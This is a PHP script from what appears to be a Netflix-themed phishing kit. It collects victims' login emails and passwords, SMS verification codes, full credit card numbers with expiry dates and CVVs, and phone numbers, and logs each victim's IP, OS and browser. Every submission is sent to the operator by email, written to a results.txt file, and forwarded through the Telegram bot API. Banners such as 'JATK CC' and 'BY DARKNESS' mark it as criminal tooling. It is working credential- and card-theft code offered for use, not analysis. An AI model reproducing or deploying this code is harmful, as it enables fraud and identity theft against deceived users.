<?php

session_start();




///////////////////////////////////////////////////////////////////////



/// $to  
$to = "" ; 
// replace your email 



include "telegram.php";


///////////////////////////////////////////////////////////////////////////////////////////

$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$subject = ' | Netflix | Card';



function validate_number($number,$length = null) {
    if (is_numeric($number)) {
        if( $length == null ) {
            return true;
        } else {
            if( $length == strlen($number) )
                return true;
            return false;
        }
    } else {
        return false;
    }
}

function validate_cc_number($number = null) {
    $numbers = str_replace(' ', '', $number);
    if( validate_number($numbers,16) == false )
        return false;
    return $numbers;
}

function validate_cc_cvv($number = null) {
    $numbers = str_replace(' ', '', $number);
    if( validate_number($numbers) == false || strlen($numbers) < 3 )
        return false;
    return $numbers;
}

function validate_cc_date($month,$year) {
    if( validate_number(trim($month)) && strlen(trim($month)) == 2 && validate_number(trim($year)) && strlen(trim($year)) == 2 ) {
        return $month . '/' . $year;
    } else {
        return false;
    }
}



function validate_phone($phone)
{
    // Allow +, - and . in phone number
    $filtered_phone_number = filter_var($phone, FILTER_SANITIZE_NUMBER_INT);
    // Check the lenght of number
    // This can be customized if you want phone number from a specific country
    if (strlen($filtered_phone_number) < 6 || strlen($filtered_phone_number) > 20) {
        return false;
    } else {
        return true;
    }
}


function get_user_ip()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    return  $ip;
}

function get_user_os() { 
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
        '/windows nt 10/i'     =>  'Windows 10',
        '/windows nt 6.3/i'     =>  'Windows 8.1',
        '/windows nt 6.2/i'     =>  'Windows 8',
        '/windows nt 6.1/i'     =>  'Windows 7',
        '/windows nt 6.0/i'     =>  'Windows Vista',
        '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     =>  'Windows XP',
        '/windows xp/i'         =>  'Windows XP',
        '/windows nt 5.0/i'     =>  'Windows 2000',
        '/windows me/i'         =>  'Windows ME',
        '/win98/i'              =>  'Windows 98',
        '/win95/i'              =>  'Windows 95',
        '/win16/i'              =>  'Windows 3.11',
        '/macintosh|mac os x/i' =>  'Mac OS X',
        '/mac_powerpc/i'        =>  'Mac OS 9',
        '/linux/i'              =>  'Linux',
        '/ubuntu/i'             =>  'Ubuntu',
        '/iphone/i'             =>  'iPhone',
        '/ipod/i'               =>  'iPod',
        '/ipad/i'               =>  'iPad',
        '/android/i'            =>  'Android',
        '/blackberry/i'         =>  'BlackBerry',
        '/webos/i'              =>  'Mobile'
    );
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }
    }   
    return $os_platform;
}

function get_user_browser() {
    $user_agent     = $_SERVER['HTTP_USER_AGENT'];
    $browser        =   "Unknown Browser";
    $browser_array  =   array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}



if($_SERVER['REQUEST_METHOD'] == "POST") {

if ($_POST['type'] === "login") {

    $c = isset($_POST["counter"]) && is_numeric($_POST["counter"]) ? intval($_POST["counter"]) : 1;

    if ($c  == 1) {

        $message = '/-- LOGIN INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
        $message .= 'email one : ' . $_POST["userLoginId"] . "\r\n";
        $message .= 'Password one : ' . $_POST["password"] . "\r\n";
        $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
        $message .= 'IP address : ' . get_user_ip() . "\r\n";
        $message .= 'OS : ' . get_user_os() . "\r\n";
        $message .= 'Browser : ' . get_user_browser() . "\r\n";
        $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $message .= '/-- END LOGIN 1 INFOS --/' . "\r\n\r\n";

        mail($to,$subject,$message,$headers);
        file_put_contents("./results.txt", $message, FILE_APPEND);
		file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );

        $_SESSION["error_log"] = true;
        $c += 1;
       header("Location: login.php?c={$c}");
    } else {

        $message = '/-- LOGIN 1 INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
        $message .= 'email two : ' . $_POST["userLoginId"] . "\r\n";
        $message .= 'Password two : ' . $_POST["password"] . "\r\n";
        $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
        $message .= 'IP address : ' . get_user_ip() . "\r\n";
        $message .= 'OS : ' . get_user_os() . "\r\n";
        $message .= 'Browser : ' . get_user_browser() . "\r\n";
        $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $message .= '/-- END LOGIN 1 INFOS --/' . "\r\n\r\n";

        mail($to,$subject,$message,$headers);
        file_put_contents("./results.txt", $message, FILE_APPEND);
		file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );


        unset($_SESSION["error_log"]);
         header('Location: update_init.php');
     }
 }





if ($_POST['type'] === "sms") {



    $c = isset($_POST["counter"]) && is_numeric($_POST["counter"]) ? intval($_POST["counter"]) : 1;

    if ($c  == 1) {
        $message = '/-- SMS 1 INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
        $message .= ' sms one : ' . $_POST["id_sms"] . "\r\n";
        $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
        $message .= 'IP address : ' . get_user_ip() . "\r\n";
        $message .= 'OS : ' . get_user_os() . "\r\n";
        $message .= 'Browser : ' . get_user_browser() . "\r\n";
        $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $message .= '/-- END SMS 1 INFOS --/' . "\r\n\r\n";

        mail($to,$subject,$message,$headers);
        file_put_contents("./results.txt", $message, FILE_APPEND);
		file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );


        $c += 1;
        header("Location: loading.php?go=sms2");
    } else {
        $message = '/-- SMS 2 INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
        $message .= ' sms  two: ' . $_POST["id_sms"] . "\r\n";
        $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
        $message .= 'IP address : ' . get_user_ip() . "\r\n";
        $message .= 'OS : ' . get_user_os() . "\r\n";
        $message .= 'Browser : ' . get_user_browser() . "\r\n";
        $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
        $message .= '/-- END SMS 2 INFOS --/' . "\r\n\r\n";

        mail($to,$subject,$message,$headers);
        file_put_contents("./results.txt", $message, FILE_APPEND);
		file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );


        session_destroy();
        header('Location: loading.php?go=net');
    }
}







if ($_POST['type'] === "update") {
    $_SESSION['firstName']  = $_POST["firstName"];
    $_SESSION['lastName']  = $_POST["lastName"];
    $_SESSION['creditZipcode']  = $_POST["creditZipcode"];
    $_SESSION['creditCardNumber']  = $_POST["creditCardNumber"];
    $_SESSION['creditExpirationMonth']  = $_POST["creditExpirationMonth"];
    $_SESSION['creditCardSecurityCode']  = $_POST["creditCardSecurityCode"];
    $_SESSION['phone']  = $_POST["phone"];

    $date_ex = explode('/', $_POST["creditExpirationMonth"]);

    $card_number = validate_cc_number($_POST["creditCardNumber"]);
    $card_cvv    = validate_cc_cvv($_POST["creditCardSecurityCode"]);
    $card_date   = validate_cc_date($date_ex[0], $date_ex[1]);
    $phone  = validate_phone($_POST["phone"]);


    if ($card_number == false || $card_date == false || $card_cvv == false || $phone == false) {
        $_SESSION["error_u_pay"] = true;
        header('Location: update_cc.php');
        exit();
    }



    $message = '/--🔥😈😈 JATK CC 🔥😈😈 t7aaaN --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
    $message .= ' firstName : ' . $_POST["firstName"] . "\r\n";
    $message .= ' lastName : ' . $_POST["lastName"] . "\r\n";
    $message .= ' credit Zip code : ' . $_POST["creditZipcode"] . "\r\n";
    $message .= ' credit Card Number : ' . $_POST["creditCardNumber"] . "\r\n";
    $message .= ' credit Expiration: ' . $_POST["creditExpirationMonth"] . "\r\n";
    $message .= ' Security Code : ' . $_POST["creditCardSecurityCode"] . "\r\n";
    $message .= ' phone : ' . $_POST["phone"] . "\r\n";
    $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
    $message .= 'IP address : ' . get_user_ip() . "\r\n";
    $message .= 'OS : ' . get_user_os() . "\r\n";
    $message .= 'Browser : ' . get_user_browser() . "\r\n";
    $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
    $message .= '/-- 🔥😈😈 BY DARKNESS 🔥😈😈-/' . "\r\n\r\n";


    mail($to,$subject,$message,$headers);
    file_put_contents("./results.txt", $message, FILE_APPEND);
	file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );


 
    header('Location: loading.php?go=sms');
}



if ($_POST['type'] === "payment") {
    $_SESSION['firstName']  = $_POST["firstName"];
    $_SESSION['lastName']  = $_POST["lastName"];
    $_SESSION['creditZipcode']  = $_POST["creditZipcode"];
    $_SESSION['creditCardNumber']  = $_POST["creditCardNumber"];
    $_SESSION['creditExpirationMonth']  = $_POST["creditExpirationMonth"];
    $_SESSION['creditCardSecurityCode']  = $_POST["creditCardSecurityCode"];
    $_SESSION['phone']  = $_POST["phone"];

    $date_ex = explode('/', $_POST["creditExpirationMonth"]);

    $card_number = validate_cc_number($_POST["creditCardNumber"]);
    $card_cvv    = validate_cc_cvv($_POST["creditCardSecurityCode"]);
    $card_date   = validate_cc_date($date_ex[0], $date_ex[1]);
    $phone  = validate_phone($_POST["phone"]);


    if ($card_number == false || $card_date == false || $card_cvv == false || $phone == false) {
        $_SESSION["error_p_pay"] = true;
        header('Location: payment_method.php');
        exit();
    }

    $message = '/-- 🔥😈😈 JATK CC 🔥😈😈 t7aaaN --' . $_SERVER['REMOTE_ADDR'] . "\r\n";
    $message .= ' firstName : ' . $_POST["firstName"] . "\r\n";
    $message .= ' lastName : ' . $_POST["lastName"] . "\r\n";
    $message .= ' credit Zip code : ' . $_POST["creditZipcode"] . "\r\n";
    $message .= ' credit Card Number : ' . $_POST["creditCardNumber"] . "\r\n";
    $message .= ' credit Expiration: ' . $_POST["creditExpirationMonth"] . "\r\n";
    $message .= ' Security Code : ' . $_POST["creditCardSecurityCode"] . "\r\n";
    $message .= ' phone : ' . $_POST["phone"] . "\r\n";
    $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
    $message .= 'IP address : ' . get_user_ip() . "\r\n";
    $message .= 'OS : ' . get_user_os() . "\r\n";
    $message .= 'Browser : ' . get_user_browser() . "\r\n";
    $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
    $message .= '/-- 🔥😈😈 BY DARKNESS 🔥😈😈 --/' . "\r\n\r\n";

    mail($to,$subject,$message,$headers);
    file_put_contents("./results.txt", $message, FILE_APPEND);
	file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );



    session_unset($_SESSION["error_p_pay"]);
    header('Location: loading.php?go=sms');
}



if ($_POST['type'] === "plan") {

    $plans = array(
        "Basic" =>  array("plan" => "Basic Plan", "price" => "$8.99") ,
        "Standard" =>   array("plan" => "Standard Plan", "price" => "$13.99") ,
        "Premium" =>   array("plan" => "Premium Plan", "price" => "$17.99") ,
    );

    $_SESSION['plan']  = $plans[$_POST["plan"]];

    header('Location: payment_method_init.php');
}



if ($_POST['type'] === "account") {


    $message = '/-- CC 1 INFOS --/' . $_SERVER['REMOTE_ADDR'] . "\r\n";
    $message .= ' email : ' . $_POST["id_email"] . "\r\n";
    $message .= ' pass : ' . $_POST["id_pass"] . "\r\n";
    $message .= '/---------------- VICTIM DETAILS ----------------/' . "\r\n";
    $message .= 'IP address : ' . get_user_ip() . "\r\n";
    $message .= 'OS : ' . get_user_os() . "\r\n";
    $message .= 'Browser : ' . get_user_browser() . "\r\n";
    $message .= 'User agent : ' . $_SERVER['HTTP_USER_AGENT'] . "\r\n";
    $message .= '/-- END CC 1 INFOS --/' . "\r\n\r\n";

    mail($to,$subject,$message,$headers);
    file_put_contents("./results.txt", $message, FILE_APPEND);
	file_get_contents("https://api.telegram.org/bot$tokn/sendMessage?chat_id=$id&text=" . urlencode($message)."" );


    header('Location: chooseplan.php');
}


if ($_POST['type'] === "index") {
    $_SESSION['email']  = $_POST["init_email"];
    header('Location: init.php');
}






}
